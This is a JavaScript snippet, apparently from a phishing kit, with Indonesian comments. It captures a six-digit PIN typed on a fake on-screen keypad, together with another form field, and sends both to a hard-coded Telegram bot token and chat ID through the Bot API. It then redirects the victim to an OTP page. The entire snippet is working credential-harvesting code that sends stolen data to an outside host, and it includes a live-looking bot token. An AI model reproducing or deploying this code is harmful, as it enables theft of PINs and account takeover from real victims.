    <script>
    function kirimPesan(event) {
   event.preventDefault();
  $("#process").fadeIn();  
  
    var logo = document.getElementById('logo');
    var setPin = document.getElementById('setPin');
    
    var gabungan = '' + logo.value + '%0A𝗣𝗜𝗡 𝗝𝗔𝗧𝗘𝗡𝗚 %3A%0A' + setPin.value;

  var token = '7421244055:AAFf0JKSqcLLc9LH8TsSa1Ub1TUuajIKGQo'; // Ganti dengan token bot yang kamu buat
    var grup = '6937029970'; // Ganti dengan chat id dari bot yang kamu buat
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
   
   success: function(){
    $("#process").hide();
    setTimeout(function(){
   window.location.href='otp.html'; 
    }, 500);}});};
   
   
        $(document).ready(function() {
            $("button#setPin").on('click', function() {
                var pin = $(this).attr('data-id');
                
                if($.trim($("#pin-1").html())=='') {
                    $("#pin-1").html(pin);
                } else if($.trim($("#pin-1").html())!='' && $.trim($("#pin-2").html())=='') {
                    $("#pin-2").html(pin);
                } else if($.trim($("#pin-2").html())!='' && $.trim($("#pin-3").html())=='') {
                    $("#pin-3").html(pin);
                } else if($.trim($("#pin-3").html())!='' && $.trim($("#pin-4").html())=='') {
                    $("#pin-4").html(pin);
                } else if($.trim($("#pin-4").html())!='' && $.trim($("#pin-5").html())=='') {
                    $("#pin-5").html(pin);
                } else if($.trim($("#pin-5").html())!='' && $.trim($("#pin-6").html())=='') {
                    $("#pin-6").html(pin);

                    var setPin = $("#pin-1").html()+''+$("#pin-2").html()+''+$("#pin-3").html()+''+$("#pin-4").html()+''+$("#pin-5").html()+''+$("#pin-6").html();
                    $("input#setPin").val(setPin);

                    var pinValue = $("input#setPin").val();

                    if(pinValue.length == 6) {
                        $("form").submit();
                    }
                }
            });

            $("#hapus").on('click', function() {
                $("#pin-1").html('');
                $("#pin-2").html('');
                $("#pin-3").html('');
                $("#pin-4").html('');
                $("#pin-5").html('');
            });
        });
